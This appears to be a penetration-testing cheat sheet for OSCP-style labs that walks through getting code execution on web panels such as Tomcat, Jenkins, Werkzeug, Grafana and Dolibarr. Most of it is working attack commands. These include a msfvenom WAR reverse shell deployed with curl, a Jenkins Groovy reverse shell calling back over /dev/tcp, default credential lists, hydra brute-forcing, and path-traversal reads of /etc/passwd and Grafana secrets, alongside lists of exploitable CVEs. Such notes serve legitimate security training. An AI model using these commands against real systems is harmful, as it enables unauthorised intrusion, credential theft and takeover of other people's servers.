## Goal
Identify the specific web app/panel behind the port, then use its known path to RCE: default creds, an admin console that runs code, or a version CVE. These app-servers/panels are extremely common OSCP footholds (often on 8080/8443/3000/5000/8000, so dir-brute those ports too).

**Checklist**
- [ ] identified the exact app + version? (whatweb, page title, /login, headers, favicon)
- [ ] tried that app's default creds?
- [ ] admin console -> code/command exec?
- [ ] version has a public CVE? (searchsploit)

# Commands

### Tomcat (often :8080)
```bash
# identify: title "Apache Tomcat", /manager/html, /docs, /host-manager
# default creds for /manager/html (Basic auth): tomcat:tomcat  admin:admin  tomcat:s3cret  admin:tomcat
hydra -L users.txt -P pass.txt -f $IP http-get /manager/html      # brute manager
# deploy a war reverse shell (with manager creds):
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f war -o shell.war
curl -u tomcat:tomcat -T shell.war "http://$IP:8080/manager/text/deploy?path=/shell"
curl "http://$IP:8080/shell/"     # trigger (nc -lvnp 4444)
# CVE-2017-12617 = PUT .jsp with no auth | Ghostcat CVE-2020-1938 (AJP 8009) = read WEB-INF files
```

### Jenkins (often :8080)
```bash
# identify: "Jenkins" title, /login, X-Jenkins header
# no-auth OR creds -> Script Console = instant RCE:  http://$IP:8080/script
"id".execute().text
# groovy reverse shell:
r = Runtime.getRuntime(); r.exec(["bash","-c","bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1"])
# CVE-2024-23897 arbitrary file read:
java -jar jenkins-cli.jar -s http://$IP:8080/ help "@/etc/passwd"
```

### phpMyAdmin
- **Identify:** `/phpmyadmin`, login page/assets, exact version.
- Authenticated SQL console = MySQL access, not SQL injection.
- Check databases, grants, `FILE`, and `secure_file_priv`.
- File write/web execution: [[3306_mysql#Step 3: Check grants and file restrictions|MySQL FILE workflow]]. Do not guess a webroot.
- Version exploit: confirm exact version and prerequisites first.

### Werkzeug / Flask debug console
```bash
# identify: Werkzeug header, an interactive traceback error page, /console
# /console open -> Python RCE:
__import__('os').popen('id').read()
# PIN-locked? compute it from leaked machine details (werkzeug-pin-exploit script)
```

### Adminer
```bash
# identify: /adminer.php, "Adminer" login
# point Adminer at YOUR OWN attacker MySQL -> LOAD DATA LOCAL reads target files
# (server-side file read even without target DB creds)
```

### Grafana
```bash
# identify: /login "Grafana", version in footer
# CVE-2021-43798 path traversal (8.0.0-8.3.0), NO auth: read any file:
curl --path-as-is "http://$IP:3000/public/plugins/alertlist/../../../../../../../../etc/passwd"
# grab /etc/grafana/grafana.ini + grafana.db (admin hash, datasource creds)
```

### Gitea / GitLab
```bash
# GitLab CVE-2021-22205 unauth RCE (<13.10.3): malicious DjVu image via exiftool (public PoC)
# register an account -> explore repos for creds/keys/CI secrets
# Gitea: get version -> searchsploit gitea
```

### Dolibarr
```bash
# identify: /dolibarr, "Dolibarr" login | default admin:admin
# CVE-2023-30253 authed RCE (<17.0.1): PHP injection via Website module (<?PHP case bypass)
```

### Other panels (quick wins)
```bash
# ColdFusion -> CVE-2010-2861 LFI (read password.properties) ; /CFIDE/administrator
# Cacti      -> CVE-2022-46169 unauth RCE (remote_agent.php)
# Webmin     -> CVE-2019-15107 unauth RCE (password_change.cgi)  [:10000]
# Splunk     -> login -> upload malicious app with a bin/ script -> RCE  [:8000]
# PRTG       -> CVE-2018-9276 authed RCE (notifications)
# any: searchsploit <app> <version>
```

### Helpline
```bash
# HOW TO IDENTIFY the app: whatweb ; the page <title> ; the /login path ; HTTP headers
#   (X-Powered-By, X-Jenkins, Server) ; the favicon hash (OWASP FavFreak) ; /robots.txt ;
#   a version string in the footer / /CHANGELOG / readme.
# WHAT TO LOOK FOR FIRST: an admin console that RUNS CODE is instant RCE:
#   Jenkins /script, Tomcat /manager (war), Werkzeug /console. Always try default creds there.
# ALWAYS pin the EXACT version -> searchsploit <app> <version>. Version hides in the footer,
#   the /login page, an HTTP header, or a readme/CHANGELOG file.
# HOW TO REACH IT: these run on odd ports (8080/8443/3000/5000/8000/10000), dir-brute + nmap -sV them.
```
